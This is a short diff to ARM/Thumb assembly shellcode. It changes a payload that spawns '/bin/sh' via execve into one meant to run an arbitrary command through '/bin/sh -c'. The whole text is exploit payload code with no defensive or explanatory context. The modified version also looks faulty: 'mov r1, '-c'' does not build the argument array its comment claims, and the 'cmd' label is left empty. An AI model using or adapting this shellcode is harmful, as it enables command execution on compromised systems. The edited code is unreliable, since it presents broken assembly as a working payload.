@@ -15,13 +15,16 @@ _start:
     bx     r3
     
     .code 16
-    // execve("/bin/sh", NULL, NULL);
-    adr    r0, sh         // r0 = "/bin/sh"
-    eor    r1, r1, r1     // r1 = NULL
+    // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
     eor    r2, r2, r2     // r2 = NULL
-    strb   r2, [r0, #7]   // add null terminator    
+    
+    adr    r0, sh         // r0 = "/bin/sh"
+    strb   r2, [r0, #7]   // add null terminator
+
+    mov    r1, '-c'    
     mov    r7, #11        // r7 = execve
     svc    1
     nop                   // align by 4 bytes
 sh:    
 .ascii "/bin/shX"
+cmd:
